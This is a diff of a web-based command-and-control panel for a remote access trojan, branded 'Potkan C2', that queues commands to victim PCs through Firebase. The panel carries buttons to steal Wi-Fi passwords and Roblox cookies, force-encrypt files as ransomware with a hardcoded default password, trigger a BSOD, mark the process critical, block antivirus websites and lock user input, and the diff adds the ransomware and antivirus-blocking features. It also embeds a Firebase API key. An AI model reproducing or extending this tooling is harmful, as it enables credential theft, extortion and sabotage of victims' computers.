@@ -3,148 +3,322 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Multi-PC Control | Admin</title>
+    <title>Potkan C2 Control</title>
+    <!-- Use Phosphor Icons for professional look -->
+    <script src="https://unpkg.com/@phosphor-icons/web"></script>
     <style>
-        :root { --bg: #0f172a; --card: #1e293b; --text: #e2e8f0; --accent: #3b82f6; --danger: #ef4444; --success: #22c55e; --warn: #eab308; }
-        body { background-color: var(--bg); color: var(--text); font-family: 'Segoe UI', sans-serif; margin: 0; padding: 20px; display: flex; flex-direction: column; align-items: center; min-height: 100vh; }
-        h1 { background: linear-gradient(135deg, var(--accent), #8b5cf6); -webkit-background-clip: text; -webkit-text-fill-color: transparent; font-size: 2.5rem; margin-bottom: 2rem; text-transform: uppercase; }
-        
-        /* AUTH BAR */
-        .auth-bar {
-            position: fixed; top: 20px; left: 20px; display: flex; flex-direction: column; gap: 10px;
-            z-index: 1000; background: rgba(30, 41, 59, 0.8); padding: 10px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.1);
+        :root {
+            --bg-dark: #0f172a;
+            --card-bg: #1e293b;
+            --text-main: #f8fafc;
+            --text-muted: #94a3b8;
+            --primary: #3b82f6;
+            --primary-hover: #2563eb;
+            --danger: #ef4444;
+            --danger-hover: #dc2626;
+            --success: #22c55e;
+            --success-hover: #16a34a;
+            --warn: #f59e0b;
+            --warn-hover: #d97706;
+            --border: rgba(255,255,255,0.08);
         }
-        .user-email { color: #94a3b8; font-size: 0.85rem; font-weight: bold; }
-        .logout-btn { padding: 6px 12px; background: rgba(239, 68, 68, 0.2); border: 1px solid var(--danger); color: #fca5a5; border-radius: 6px; cursor: pointer; font-size: 0.8rem; }
+
+        * { box-sizing: border-box; }
+        body {
+            background-color: var(--bg-dark);
+            color: var(--text-main);
+            font-family: 'Inter', 'Segoe UI', sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            min-height: 100vh;
+        }
+
+        h1 {
+            font-weight: 800;
+            font-size: 2rem;
+            margin-bottom: 2rem;
+            background: linear-gradient(to right, var(--primary), #8b5cf6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            letter-spacing: -0.5px;
+        }
+
+        /* TOP BAR */
+        .top-bar {
+            position: fixed;
+            top: 0; left: 0; right: 0;
+            background: rgba(15, 23, 42, 0.9);
+            backdrop-filter: blur(10px);
+            padding: 15px 30px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid var(--border);
+            z-index: 1000;
+        }
+        .user-info { font-size: 0.9rem; font-weight: 600; color: var(--text-muted); }
+        .logout-btn {
+            background: transparent;
+            border: 1px solid var(--danger);
+            color: var(--danger);
+            padding: 6px 16px;
+            border-radius: 6px;
+            cursor: pointer;
+            font-size: 0.8rem;
+            transition: all 0.2s;
+        }
         .logout-btn:hover { background: var(--danger); color: white; }
 
-        .pc-selector { width: 100%; max-width: 600px; margin-bottom: 30px; background: var(--card); padding: 20px; border-radius: 12px; border: 1px solid var(--accent); text-align: center; margin-top: 40px; }
-        .pc-selector select { width: 100%; padding: 15px; font-size: 1.1rem; background: #0f172a; color: white; border: 1px solid #334155; border-radius: 8px; margin-top: 10px; }
+        /* SELECTOR */
+        .control-panel {
+            width: 100%;
+            max-width: 1100px;
+            margin-top: 80px;
+        }
 
-        #mainDashboard { display: none; width: 100%; max-width: 1200px; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; }
+        .selector-box {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            padding: 25px;
+            border-radius: 12px;
+            margin-bottom: 30px;
+            text-align: center;
+            box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1);
+        }
+        select {
+            background: #0f172a;
+            color: white;
+            border: 1px solid #334155;
+            padding: 12px;
+            border-radius: 8px;
+            width: 100%;
+            max-width: 400px;
+            font-size: 1rem;
+            margin-top: 10px;
+            outline: none;
+        }
+        select:focus { border-color: var(--primary); }
+
+        /* GRID DASHBOARD */
+        .dashboard-grid {
+            display: none; /* Hidden by default */
+            grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+            gap: 20px;
+        }
+
+        .card {
+            background: var(--card-bg);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 20px;
+            transition: transform 0.2s;
+        }
+        .card:hover { transform: translateY(-2px); border-color: rgba(255,255,255,0.15); }
+
+        .card-title {
+            font-size: 1.1rem;
+            font-weight: 700;
+            margin-bottom: 15px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            color: var(--text-main);
+            padding-bottom: 12px;
+            border-bottom: 1px solid var(--border);
+        }
+        .card-title i { font-size: 1.3rem; }
+
+        .btn-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 10px;
+        }
         
-        .card { background: var(--card); padding: 20px; border-radius: 16px; border: 1px solid rgba(255,255,255,0.05); }
-        .card-header { font-size: 1.2rem; font-weight: bold; margin-bottom: 15px; border-bottom: 1px solid rgba(255,255,255,0.1); padding-bottom: 10px; }
-        .grid-buttons { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        button { padding: 12px; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; color: white; background: #334155; width: 100%; }
-        button:hover { filter: brightness(1.2); }
-        .btn-danger { background: var(--danger); }
-        .btn-success { background: var(--success); }
-        .btn-warn { background: var(--warn); color: black; }
-        .btn-info { background: var(--accent); }
-        .btn-gray { background: #475569; }
         .full-width { grid-column: span 2; }
 
-        .logs-container { width: 100%; max-width: 1200px; margin-top: 25px; background: #0f172a; border: 1px solid #334155; border-radius: 12px; padding: 20px; box-sizing: border-box; }
-        .log-title { color: #94a3b8; font-size: 0.9rem; margin-bottom: 10px; text-transform: uppercase; letter-spacing: 1px; }
-        .log-list { list-style: none; padding: 0; margin: 0; max-height: 200px; overflow-y: auto; }
-        .log-item { padding: 8px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); font-family: monospace; font-size: 0.9rem; color: #ccc; display: flex; justify-content: space-between; }
-        .log-time { color: #64748b; font-size: 0.8rem; }
-        .log-cmd { color: var(--accent); font-weight: bold; }
+        button {
+            border: none;
+            border-radius: 8px;
+            padding: 12px;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            transition: background 0.2s;
+            height: 48px; /* Fixed height for consistency */
+        }
+        
+        .btn-primary { background: var(--primary); }
+        .btn-primary:hover { background: var(--primary-hover); }
+
+        .btn-danger { background: var(--danger); }
+        .btn-danger:hover { background: var(--danger-hover); }
+
+        .btn-warn { background: var(--warn); color: #0f172a; }
+        .btn-warn:hover { background: var(--warn-hover); }
+
+        .btn-success { background: var(--success); }
+        .btn-success:hover { background: var(--success-hover); }
+
+        .btn-neutral { background: #475569; }
+        .btn-neutral:hover { background: #64748b; }
+
+        /* SLIDER */
+        input[type=range] {
+            width: 100%;
+            height: 6px;
+            background: #334155;
+            border-radius: 5px;
+            outline: none;
+            -webkit-appearance: none;
+        }
+        input[type=range]::-webkit-slider-thumb {
+            -webkit-appearance: none;
+            width: 18px;
+            height: 18px;
+            background: var(--primary);
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        /* LOGS */
+        .logs-box {
+            width: 100%;
+            max-width: 1100px;
+            margin-top: 30px;
+            background: #0f172a;
+            border: 1px solid #334155;
+            border-radius: 12px;
+            padding: 15px;
+        }
+        .log-list {
+            list-style: none;
+            padding: 0;
+            margin: 0;
+            max-height: 150px;
+            overflow-y: auto;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.85rem;
+        }
+        .log-item {
+            padding: 6px 0;
+            border-bottom: 1px solid #1e293b;
+            color: #cbd5e1;
+            display: flex;
+            justify-content: space-between;
+        }
+        .log-ts { color: #64748b; font-size: 0.75rem; }
+
     </style>
 </head>
 <body>
 
-    <div class="auth-bar">
-        <span id="userDisplay" class="user-email">Checking...</span>
-        <button class="logout-btn" onclick="logout()">Log Out</button>
+    <!-- TOP BAR -->
+    <div class="top-bar">
+        <h1>POTKAN <span style="font-size:1rem; opacity:0.7; font-weight:400;">C2 PANEL</span></h1>
+        <div style="display:flex; align-items:center; gap:15px;">
+            <span id="userDisplay" class="user-info">Authenticating...</span>
+            <button class="logout-btn" onclick="logout()">LOGOUT</button>
+        </div>
     </div>
 
-    <h1>🚀 Multi-PC Command</h1>
-
-    <div class="pc-selector">
-        <h3>🎯 Select Target PC</h3>
-        <select id="categorySelect" onchange="selectPC()">
-            <option value="">🔄 Loading PC List...</option>
-        </select>
-        <p id="targetStatus" style="margin-top:10px; color:#aaa; font-size:0.9rem;">Please select a PC to control.</p>
-    </div>
-
-    <div id="mainDashboard" class="dashboard"> 
+    <div class="control-panel">
         
-        <!-- POWER & INPUT -->
-        <div class="card" style="border-color: #ff9100;">
-            <div class="card-header">⚡ Power & Input</div>
-            <div class="grid-buttons">
-                <button class="btn-info" onclick="cmd('lock_pc')">🔒 Lock PC</button>
-                <button class="btn-warn" onclick="cmd('restart_pc')">🔄 Restart</button>
-                <button class="btn-danger full-width" onclick="confirmAction('shutdown_pc')">🛑 Shutdown</button>
-                <button class="btn-danger full-width" onclick="confirmAction('bsod')">💀 BSOD</button>
-                <button class="btn-danger" onclick="toggleInput(true)">🚫 Block Input</button>
-                <button class="btn-success" onclick="toggleInput(false)">✅ Free Input</button>
-                <button class="btn-danger full-width" onclick="cmd('block_screen')">⬛ Block Screen</button>
-            </div>
-        </div>
-        
-        <!-- SYSTEM & TASKBAR -->
-        <div class="card" style="border-color: #3b82f6;">
-            <div class="card-header">🛠️ System & Taskbar</div>
-            <div class="grid-buttons">
-                <button class="btn-info" onclick="cmd('check_admin')">🛡️ Check Admin</button>
-                <button class="btn-danger" onclick="confirmAction('set_critical')">⚠️ Set Critical</button>
-                <button class="btn-success" onclick="cmd('unset_critical')">✅ Unset Critical</button>
-                <button class="btn-gray" onclick="cmd('hide_taskbar')">🙈 Hide Taskbar</button>
-                <button class="btn-info" onclick="cmd('show_taskbar')">👁️ Show Taskbar</button>
-                <button class="btn-danger" onclick="askBlacklist()">❌ Blacklist App</button>
-                <button class="btn-success" onclick="askWhitelist()">✅ Whitelist App</button>
-            </div>
+        <!-- SELECTOR -->
+        <div class="selector-box">
+            <i class="ph ph-desktop" style="font-size:2rem; color:var(--primary); margin-bottom:10px;"></i>
+            <h3 style="margin:0;">Select Target Machine</h3>
+            <select id="categorySelect" onchange="selectPC()">
+                <option value="">-- Waiting for Connection --</option>
+            </select>
+            <p id="targetStatus" style="margin-top:10px; color:var(--text-muted); font-size:0.9rem;">No target selected</p>
         </div>
 
-        <!-- STEALERS -->
-        <div class="card" style="border-color: #a855f7;">
-            <div class="card-header">🕵️ Stealers</div>
-            <div class="grid-buttons">
-                <button class="btn-info full-width" onclick="cmd('wifi_stealer')">📶 Steal Wi-Fi</button>
-                <button class="btn-warn full-width" onclick="cmd('grab_roblox')">🍪 Grab Roblox Cookie</button>
+        <!-- DASHBOARD -->
+        <div id="mainDashboard" class="dashboard-grid">
+
+            <!-- 1. POWER -->
+            <div class="card">
+                <div class="card-title"><i class="ph ph-lightning" style="color:var(--warn);"></i> Power Control</div>
+                <div class="btn-grid">
+                    <button class="btn-primary" onclick="cmd('lock_pc')"><i class="ph ph-lock"></i> Lock</button>
+                    <button class="btn-warn" onclick="cmd('restart_pc')"><i class="ph ph-arrows-clockwise"></i> Restart</button>
+                    <button class="btn-danger full-width" onclick="confirmAction('shutdown_pc')"><i class="ph ph-power"></i> Shutdown</button>
+                    <button class="btn-danger full-width" onclick="confirmAction('bsod')"><i class="ph ph-skull"></i> BSOD</button>
+                    <button class="btn-danger" onclick="toggleInput(true)"><i class="ph ph-keyboard-slash"></i> Block Input</button>
+                    <button class="btn-success" onclick="toggleInput(false)"><i class="ph ph-keyboard"></i> Free Input</button>
+                </div>
             </div>
+
+            <!-- 2. SECURITY & NETWORK (NEW) -->
+            <div class="card" style="border-top: 3px solid var(--danger);">
+                <div class="card-title"><i class="ph ph-shield-warning" style="color:var(--danger);"></i> Security & Net</div>
+                <div class="btn-grid">
+                    <button class="btn-danger full-width" onclick="cmd('block_av_sites')"><i class="ph ph-prohibit"></i> Block AV Sites</button>
+                    <button class="btn-success full-width" onclick="cmd('unblock_av_sites')"><i class="ph ph-check-circle"></i> Unblock AV Sites</button>
+                    <button class="btn-danger" onclick="confirmAction('set_critical')"><i class="ph ph-warning"></i> Set Critical</button>
+                    <button class="btn-success" onclick="cmd('unset_critical')"><i class="ph ph-shield-check"></i> Unset</button>
+                    <button class="btn-primary full-width" onclick="cmd('check_admin')"><i class="ph ph-user-gear"></i> Check Admin</button>
+                </div>
+            </div>
+
+            <!-- 3. STEALERS -->
+            <div class="card" style="border-top: 3px solid #a855f7;">
+                <div class="card-title"><i class="ph ph-spy" style="color:#a855f7;"></i> Data Extraction</div>
+                <div class="btn-grid">
+                    <button class="btn-primary full-width" onclick="cmd('wifi_stealer')"><i class="ph ph-wifi-high"></i> Steal Wi-Fi</button>
+                    <button class="btn-warn full-width" onclick="cmd('grab_roblox')"><i class="ph ph-cookie"></i> Roblox Cookie</button>
+                    <button class="btn-neutral full-width" onclick="cmd('hide_taskbar')"><i class="ph ph-eye-slash"></i> Hide Taskbar</button>
+                    <button class="btn-primary full-width" onclick="cmd('show_taskbar')"><i class="ph ph-eye"></i> Show Taskbar</button>
+                </div>
+            </div>
+
+            <!-- 4. ENCRYPTION -->
+            <div class="card" style="border-top: 3px solid var(--danger);">
+                <div class="card-title"><i class="ph ph-lock-key" style="color:var(--danger);"></i> Ransomware</div>
+                <div class="btn-grid">
+                    <button class="btn-danger full-width" onclick="askForceEncrypt()"><i class="ph ph-lock-simple"></i> Force Encrypt</button>
+                    <button class="btn-success full-width" onclick="askDecrypt()"><i class="ph ph-lock-open"></i> Decrypt Files</button>
+                </div>
+            </div>
+
+            <!-- 5. MEDIA & TROLLING -->
+            <div class="card">
+                <div class="card-title"><i class="ph ph-speaker-high" style="color:var(--success);"></i> Media & Troll</div>
+                <div class="btn-grid">
+                    <button class="btn-primary full-width" onclick="askTTS()"><i class="ph ph-microphone"></i> TTS Speak</button>
+                    <button class="btn-warn full-width" onclick="cmd('jumpscare')"><i class="ph ph-ghost"></i> Jumpscare</button>
+                    <button class="btn-primary full-width" onclick="askMsgBox()"><i class="ph ph-chat-centered-text"></i> Fake Error</button>
+                    <div class="full-width" style="padding:10px 0;">
+                        <input type="range" min="0" max="100" value="50" onchange="setVolume(this.value)">
+                    </div>
+                </div>
+            </div>
+
         </div>
 
-        <!-- ENCRYPTION -->
-        <div class="card" style="border-color: #ef4444;">
-            <div class="card-header">🔐 Encryption</div>
-            <div class="grid-buttons">
-                <button class="btn-danger full-width" onclick="askForceEncrypt()">💀 Force Encrypt</button>
-                <button class="btn-success full-width" onclick="askDecrypt()">🔓 Decrypt Files</button>
-                <button class="btn-info full-width" onclick="cmd('encryption_status')">ℹ️ Check Status</button>
-            </div>
+        <!-- LOGS -->
+        <div class="logs-box">
+            <h4 style="margin-top:0; color:var(--text-muted); font-size:0.8rem; text-transform:uppercase;">Activity Log</h4>
+            <ul class="log-list" id="logList"></ul>
         </div>
 
-        <!-- MEDIA -->
-        <div class="card" style="border-color: #3cff6d;">
-            <div class="card-header">🔊 Media</div>
-            <div class="grid-buttons">
-                <button class="btn-gray" onclick="cmd('mute')">🔇 Mute</button>
-                <button class="btn-success" onclick="cmd('unmute')">🔊 Unmute</button>
-                <button class="btn-info full-width" onclick="askTTS()">🗣️ Speak</button>
-                <div class="full-width"><input type="range" min="0" max="100" value="50" onchange="setVolume(this.value)" style="width:100%"></div>
-            </div>
-        </div>
-
-        <!-- FUN & NETWORK -->
-        <div class="card" style="border-color: #00ffff;">
-            <div class="card-header">👻 Fun & Network</div>
-            <div class="grid-buttons">
-                <button class="btn-warn full-width" onclick="cmd('jumpscare')">👻 Jumpscare</button>
-                <button class="btn-info full-width" onclick="askMsgBox()">💬 Fake Error</button>
-                <button class="btn-success full-width" onclick="askURL()">🌐 Open URL</button>
-                <button class="btn-warn" onclick="askBlockURL()">🚫 Block Site</button>
-                <button class="btn-gray" onclick="askUnblockURL()">🔓 Unblock Site</button>
-            </div>
-        </div>
     </div>
 
-    <!-- LOGS -->
-    <div class="logs-container" style="border-color: #ffffffab;">
-        <div class="log-title">Command History</div>
-        <ul class="log-list" id="logList"></ul>
-    </div>
-
-    <!-- SCRIPT -->
+    <!-- SCRIPT LOGIC (Firebase same as before) -->
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
         import { getAuth, onAuthStateChanged, signOut } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
         import { getDatabase, ref, set, get, child, push, onValue, limitToLast, query } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
 
+        // CONFIG
         const firebaseConfig = {
             apiKey: "AIzaSyBhG3jjUoP6F-MHIqYKP7TvCh4FQ_Rfcd0",
             authDomain: "potkan-5132c.firebaseapp.com",
@@ -171,16 +345,16 @@
 
         window.logout = () => signOut(auth).then(() => window.location.href = "index.html");
 
-        window.currentTargetID = null; 
+        window.currentTargetID = null;
         window.currentPCName = "Unknown";
 
-        // LOAD PC STRUCTURE
+        // LOAD PCS
         get(child(dbRef, `discord_structure`)).then((snapshot) => {
             const select = document.getElementById('categorySelect');
             if (snapshot.exists()) {
                 const data = snapshot.val();
                 const structure = data.structure || data;
-                select.innerHTML = `<option value="">-- Select PC (Updated: ${data.last_updated || "now"}) --</option>`;
+                select.innerHTML = `<option value="">-- Select Target --</option>`;
                 for (const [serverName, categories] of Object.entries(structure)) {
                     if (serverName === "last_updated") continue;
                     const group = document.createElement('optgroup');
@@ -193,12 +367,9 @@
                     }
                     select.appendChild(group);
                 }
-            } else {
-                select.innerHTML = '<option>No PCs Found</option>';
             }
         });
 
-        // HANDLE PC SELECTION
         window.selectPC = function() {
             const val = document.getElementById('categorySelect').value;
             const dashboard = document.getElementById('mainDashboard');
@@ -206,8 +377,7 @@
 
             if (!val) {
                 dashboard.style.display = "none";
-                status.innerText = "Select a PC to continue.";
-                status.style.color = "#aaa";
+                status.innerText = "No target selected";
                 return;
             }
             
@@ -220,28 +390,21 @@
                 let foundID = null;
 
                 for (const [id, name] of Object.entries(channels)) {
-                    if (targetNames.includes(name.toLowerCase())) {
-                        foundID = id;
-                        break;
-                    }
+                    if (targetNames.includes(name.toLowerCase())) { foundID = id; break; }
                 }
 
                 if (foundID) {
                     window.currentTargetID = foundID;
                     dashboard.style.display = "grid"; 
-                    status.innerText = `✅ Connected to: ${category}`;
-                    status.style.color = "#22c55e";
-                    addLog(`Connected to PC: ${category}`);
+                    status.innerHTML = `<span style="color:var(--success)">● Connected:</span> ${category}`;
                 } else {
                     dashboard.style.display = "none";
-                    status.innerText = `❌ Error: No 'remote-access' channel in '${category}'.`;
-                    status.style.color = "#ef4444";
+                    status.innerHTML = `<span style="color:var(--danger)">● Error:</span> Remote access channel missing`;
                 }
             });
         };
 
-        // LOGGING
-        const logsRef = query(ref(db, 'logs'), limitToLast(20));
+        const logsRef = query(ref(db, 'logs'), limitToLast(15));
         onValue(logsRef, (snap) => {
             const list = document.getElementById('logList');
             list.innerHTML = ""; 
@@ -249,47 +412,40 @@
                 Object.values(snap.val()).reverse().forEach(log => {
                     const li = document.createElement('li');
                     li.className = 'log-item';
-                    li.innerHTML = `<span class="log-cmd">> ${log.message}</span><span class="log-time">${new Date(log.timestamp).toLocaleTimeString()}</span>`;
+                    li.innerHTML = `<span>> ${log.message}</span><span class="log-ts">${new Date(log.timestamp).toLocaleTimeString()}</span>`;
                     list.appendChild(li);
                 });
             }
         });
 
-        function addLog(msg) {
-            push(ref(db, 'logs'), { message: msg, timestamp: Date.now() });
-        }
-
-        // COMMANDS
+        // ACTIONS
         function writeDB(data) {
-            if (!window.currentTargetID) return alert("No Target PC Selected!");
+            if (!window.currentTargetID) return alert("Select a Target first!");
             data.target_id = window.currentTargetID;
             data.timestamp = Date.now();
             set(ref(db, 'queue/pending'), data);
-            addLog(`[${window.currentPCName}] Sent: ${data.type}`);
+            
+            // Clean log message
+            let msg = data.type.replace('_', ' ').toUpperCase();
+            if(data.text) msg += ` "${data.text}"`;
+            push(ref(db, 'logs'), { message: `[${window.currentPCName}] ${msg}`, timestamp: Date.now() });
         }
 
         window.cmd = (type) => writeDB({ type });
-        window.confirmAction = (type) => { if(confirm("This is a dangerous action. Are you sure?")) cmd(type); };
+        window.confirmAction = (type) => { if(confirm("Are you sure?")) cmd(type); };
         window.toggleInput = (block) => cmd(block ? 'disable_input' : 'enable_input');
         
         window.askTTS = () => { const t = prompt("Text to speak:"); if(t) writeDB({type:'tts', text:t}); };
-        window.askURL = () => { const u = prompt("URL to open:"); if(u) writeDB({type:'open_url', url:u}); };
-        window.askMsgBox = () => { const t = prompt("Message for box:"); if(t) writeDB({type:'msgbox', text:t}); };
+        window.askMsgBox = () => { const t = prompt("Message:"); if(t) writeDB({type:'msgbox', text:t}); };
         window.setVolume = (v) => writeDB({type:'volume', value:v});
-        window.askBlockURL = () => { const d = prompt("Domain to block:"); if(d) writeDB({type:'block_url', domain:d}); };
-        window.askUnblockURL = () => { const d = prompt("Domain to unblock:"); if(d) writeDB({type:'unblock_url', domain:d}); };
-        window.askBlacklist = () => { const n = prompt("Process name to blacklist:"); if(n) writeDB({type:'blacklist', name:n}); };
-        window.askWhitelist = () => { const n = prompt("Process name to whitelist:"); if(n) writeDB({type:'whitelist', name:n}); };
         
         window.askForceEncrypt = () => {
-            const p = prompt("Set Encryption Password (or leave empty for default):");
-            if(confirm("⚠️ DANGER: This will encrypt files! Proceed?")) {
-                writeDB({type:'force_encrypt', password: p || "scripty_rat_best_777"});
-            }
+            const p = prompt("Password (optional):");
+            if(confirm("⚠ ENCRYPT FILES? This is destructive.")) writeDB({type:'force_encrypt', password: p || "scripty_rat_best_777"});
         };
         window.askDecrypt = () => {
-            const p = prompt("Enter Decryption Password:");
-            if (p) writeDB({type:'decrypt_files', password: p});
+            const p = prompt("Decryption Password:");
+            if(p) writeDB({type:'decrypt_files', password: p});
         };
     </script>
 </body>
